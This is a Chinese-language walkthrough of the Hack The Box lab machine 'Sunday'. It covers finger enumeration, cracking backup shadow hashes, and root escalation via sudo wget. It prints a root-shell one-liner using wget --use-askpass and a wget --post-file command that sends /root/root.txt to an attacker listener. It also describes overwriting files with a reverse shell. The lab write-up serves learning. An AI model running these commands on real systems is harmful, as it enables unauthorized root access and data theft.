## nmap

```Bash
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
515/tcp   open  printer
6787/tcp  open  smc-admin
22022/tcp open  unknown

```

```Bash
PORT      STATE  SERVICE  VERSION
79/tcp    open   finger?
| fingerprint-strings:
|   GenericLines:
|     No one logged on
|   GetRequest:
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions:
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help:
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest:
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie:
|_    Login Name TTY Idle When Where
|_finger: No one logged on\x0D
111/tcp   open   rpcbind  2-4 (RPC #100000)
515/tcp open  printer
6787/tcp  open   ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14)
| http-title: Solaris Dashboard
|_Requested resource was https://10.10.10.76:6787/solaris/
| ssl-cert: Subject: commonName=sunday
| Subject Alternative Name: DNS:sunday
| Not valid before: 2021-12-08T19:40:00
|_Not valid after:  2031-12-06T19:40:00
|_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
22022/tcp open   ssh      OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)

```



## finger

finger是什么

> **Finger** is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are fingering. These details may include the office location and phone number (if known), login time, idle time, time mail was last read, and the user's plan and project files.

```Bash
# 简单探测，只能明确一个root用户

└─# nc -vn 10.10.10.76 79
(UNKNOWN) [10.10.10.76] 79 (finger) open

No one logged on

┌──(root㉿walle)-[/home/machines/linux/sunday]
└─# finger @10.10.10.76
No one logged on

┌──(root㉿walle)-[/home/machines/linux/sunday]
└─# finger root@10.10.10.76
Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Oct 14 10:28>

┌──(root㉿walle)-[/home/machines/linux/sunday]
└─# finger sunday@10.10.10.76
Login       Name               TTY         Idle    When    Where
sunday                ???

# nse脚本也没有什么有用的信息

```

通过pentestmokey的扫描脚本找到两个用户 sammy和sunny，这个脚本比msf上的poc还靠谱些

![](https://secure2.wostatic.cn/static/cGNYXG98ZnVWgN9uA99Q83/image.png?auth_key=1677500505-gftCw5jmrsFRXPtnVo4i2L-0-b50693795ca2851e59b95d7f3876282f)

root用户有未读的邮件

![](https://secure2.wostatic.cn/static/cNDcGrRUHjqKLU2AvZgvKW/image.png?auth_key=1677500505-9KY3PZFRKwzNsYgCC91XLF-0-96920ebfc6a2bfb24d98e8b4bf2b9a9e)





## HTTP 6787

### mod_wsgi

4.5.1 有一个poc ，明确是目录穿越漏洞，但版本不太匹配

访问 https://10.10.10.76:6787 soloris dashboard登录页面，需要用户名密码，且不能确定版本

目录爆破，除了登录页，没有有用信息



### openssl1.0.2

不安全的协议，没有找到匹配poc

 

## 22022

没有异常，没有poc

### 坑 - ssh密码又是靠猜

sunny/sunday 这里非常的扯淡

直接ssh后在 /home/sammy下拿到user.txt

#### sudo

没有发现有什么用，上linEnum.sh



/root/troll是root所有，正常来说不能改变, 技巧是启用一个http server，放一个反弹shell在里面，然后在靶机上去wget -Ｏ　运气好的话是可以把这个脚本覆盖掉的。

```Bash
User sunny may run the following commands on sunday:
    (root) NOPASSWD: /root/troll
sunny@sunday:~$
sunny@sunday:~$ sudo /root/troll
testing
uid=0(root) gid=0(root)
sunny@sunday:~$

```



在sunny的目录下有三个文件分析下就，没看出端倪来

```Bash
sunny@sunday:~$ ls
local.cshrc    local.login    local.profile
sunny@sunday:~$ ls -lh
total 6
-rw-r--r--   1 sunny    staff        156 Dec 19  2021 local.cshrc
-rw-r--r--   1 sunny    staff         97 Dec 19  2021 local.login
-rw-r--r--   1 sunny    staff        119 Dec 19  2021 local.profile
sunny@sunday:~$ file local.cshrc
local.cshrc:    assembler program text
sunny@sunday:~$ file local.login
local.login:    English text
sunny@sunday:~$ file local.profile
local.profile:  English text
sunny@sunday:~$ strings local.cshrc
# Copyright (c) 1991, 2018, Oracle and/or its affiliates. All rights reserved.
set path=(/usr/bin /usr/sbin)
if ( $?prompt ) then
set history=32
endif
sunny@sunday:~$ strings  local.login
# Copyright (c) 1991, 2018, Oracle and/or its affiliates. All rights reserved.
stty -istrip
sunny@sunday:~$ strings local.profile
# Copyright (c) 1991, 2018, Oracle and/or its affiliates. All rights reserved.
PATH=/usr/bin:/usr/sbin

```



回到/找找异常文件

```Bash
# /backup中放了貌似shadow文件，只有sammy和sunny的密码字段
sunny@sunday:/$ cd backup/
sunny@sunday:/backup$ ls -lh
total 4
-rw-r--r--   1 root     root         319 Dec 19  2021 agent22.backup
-rw-r--r--   1 root     root         319 Dec 19  2021 shadow.backup
sunny@sunday:/backup$ file agent22.backup
agent22.backup: ascii text
sunny@sunday:/backup$ strings agent22.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
sunny@sunday:/backup$ file shadow.backup
shadow.backup:  ascii text
sunny@sunday:/backup$ strings shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::

```

尝试shadow文件破解，sunny密码用john很快可以解出来 

用rockyou.txt 可以拿到sammy的密码 cooldude!



## 111和515

515 有相关的攻击手法，但是没有复现出来

[515 - Pentesting Line Printer Daemon (LPD) - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/515-pentesting-line-printer-daemon-lpd)





## Privilege Escalation

## 1、 wget sudo提权

```Bash
# sammy存在sudo
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

```



```Bash
-bash-4.4$ TF=$(mktemp)
-bash-4.4$ chmod +x $TF
-bash-4.4$ echo -e '#!/bin/sh\n/bin/sh 1>&0' > $TF
-bash-4.4$ sudo wget --use-askpass=$TF 0
root@sunday:/tmp# ud
/bin/sh: ud: not found [No such file or directory]
root@sunday:/tmp# id
uid=0(root) gid=0(root)
root@sunday:/tmp# cat /root/root.txt
21be1463a123cfcbf1fa1241f01e592f
root@sunday:/tmp#

```



## 2、wget 推文件到kali上，必须使用nc

提示服务器不支持post方法

```Bash
-bash-4.4$  sudo wget --post-file /root/root.txt http://10.10.16.11:443/
--2023-01-11 15:24:12--  http://10.10.16.11:443/
Connecting to 10.10.16.11:443... connected.
HTTP request sent, awaiting response... 501 Unsupported method ('POST')
2023-01-11 15:24:12 ERROR 501: Unsupported method ('POST').

```

```Bash
└─# python -m http.server 443
Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
10.10.10.76 - - [11/Jan/2023 23:24:04] code 501, message Unsupported method ('POST')
10.10.10.76 - - [11/Jan/2023 23:24:04] "POST / HTTP/1.1" 501 -

```

把http启动方式从python改成nc，虽然服务端没有正常的response，但是服务端可以收到请求，即拿到了文件内容

```Bash
-bash-4.4$  sudo wget --post-file /root/root.txt http://10.10.16.11:7777/
--2023-01-11 15:26:41--  http://10.10.16.11:7777/
Connecting to 10.10.16.11:7777... connected.
HTTP request sent, awaiting response...

```

```Bash
└─# nc -nvlp  7777
listening on [any] 7777 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.76] 62863
POST / HTTP/1.1
User-Agent: Wget/1.19.5 (solaris2.11)
Accept: */*
Accept-Encoding: identity
Host: 10.10.16.11:7777
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

21be1463a123cfcbf1fa1241f01e592f

```



## 3、系统提权

没发现这个系统和版本有可以利用的exp

```Bash
root@sunday:~# cat /etc/os-release
NAME="Oracle Solaris"
PRETTY_NAME="Oracle Solaris 11.4"
CPE_NAME="cpe:/o:oracle:solaris:11:4"
ID=solaris
VERSION=11.4
VERSION_ID=11.4
BUILD_ID=11.4.0.0.1.15.0
HOME_URL="https://www.oracle.com/solaris/"
SUPPORT_URL="https://support.oracle.com/"

```



## 4、非通用性解法 - 覆盖ｓｕｉｄ文件/覆盖shadow文件

能进行覆盖的前提是这里的sammy用户可以使用 sudo 以root无密码执行wget, 可以利用wget -O 把任意文件覆盖成一个反弹shell或者其他内容

```Bash
-e \e[00;31m[-] SUID files:\e[00m
-r-sr-xr-x   1 root     bin       631208 Aug 17  2018 /usr/lib/ssh/ssh-keysign
-r-sr-xr-x   1 root     bin        12312 Aug 17  2018 /usr/lib/inet/mailq
-rwsr-xr-x   1 root     adm        14184 Aug 17  2018 /usr/lib/acct/accton
-r-sr-xr-x   1 root     bin       127348 Aug 17  2018 /usr/lib/fs/ufs/ufsrestore
-r-sr-xr-x   1 root     bin       118728 Aug 17  2018 /usr/lib/fs/ufs/ufsdump
-r-sr-xr-x   1 root     bin        24264 Aug 17  2018 /usr/lib/fs/smbfs/umount
-r-sr-xr-x   1 root     bin        25896 Aug 17  2018 /usr/lib/fs/smbfs/mount
-r-sr-xr-x   1 root     root        8360 Dec 19  2021 /usr/lib/vmware-tools/bin/i86/vmware-user-suid-wrapper
-r-sr-xr-x   1 root     bin        19080 Aug 17  2018 /usr/lib/utmp_update
-r-sr-xr-x   2 root     bin        24424 Aug 17  2018 /usr/bin/uptime
-rwsr-xr-x   1 root     sys        44104 Aug 17  2018 /usr/bin/atrm
-r-sr-sr-x   1 root     sys        57392 Aug 17  2018 /usr/bin/passwd
-r-sr-xr-x   1 root     bin        42232 Aug 17  2018 /usr/bin/rcp
-r-sr-xr-x   1 root     sys        52632 Aug 17  2018 /usr/bin/chkey
-r-sr-xr-x   1 root     bin        75768 Aug 17  2018 /usr/bin/rmformat
-rwsr-xr-x   1 root     bin        50072 Aug 17  2018 /usr/bin/pfedit
-rwsr-xr-x   1 root     sys        39600 Aug 17  2018 /usr/bin/atq
-r-sr-xr-x   2 root     bin        24424 Aug 17  2018 /usr/bin/w
-rwsr-xr-x   1 root     bin       108360 Aug 17  2018 /usr/bin/cdrw
-r-sr-xr-x   1 root     bin        48952 Aug 17  2018 /usr/bin/crontab
-r-sr-xr-x   1 root     bin        29680 Aug 17  2018 /usr/bin/sys-suspend
-r-sr-xr-x   1 root     bin        34432 Aug 17  2018 /usr/bin/rlogin
-rwsr-xr-x   1 root     sys        20104 Aug 17  2018 /usr/bin/newgrp
-rwsr-xr-x   1 root     sys        82784 Aug 17  2018 /usr/bin/at
-r-sr-xr-x   1 root     sys        48856 Aug 17  2018 /usr/bin/su
-r-sr-xr-x   1 root     sys        19832 Aug 17  2018 /usr/bin/newtask
-r-s--x--x   1 root     bin       238480 Aug 17  2018 /usr/bin/sudo
-r-sr-xr-x   1 root     bin        24176 Aug 17  2018 /usr/bin/rsh
-r-sr-xr-x   1 root     bin        48960 Aug 17  2018 /usr/xpg4/bin/crontab
-rwsr-xr-x   1 root     sys        82888 Aug 17  2018 /usr/xpg4/bin/at
-r-sr-xr-x   1 root     bin        48960 Aug 17  2018 /usr/xpg6/bin/crontab
-r-sr-xr-x   1 root     bin        34360 Aug 17  2018 /usr/sbin/quota
-r-sr-xr-x   1 root     bin        70520 Aug 17  2018 /usr/sbin/fmdump
-r-sr-xr-x   1 root     bin        78760 Aug 17  2018 /usr/sbin/ping
-r-sr-xr-x   1 root     bin        62080 Aug 17  2018 /usr/sbin/traceroute
-r-sr-xr-x   1 root     bin        82456 Aug 17  2018 /usr/sbin/smbadm
-r-sr-xr-x   1 root     bin        24528 Aug 17  2018 /usr/sbin/whodo

```

LinEnum.txt找到了上面这些suid文件

oxdf的解法是把其中一个文件cp到/tmp下面, 然后从靶机上wget -O 一个文件,

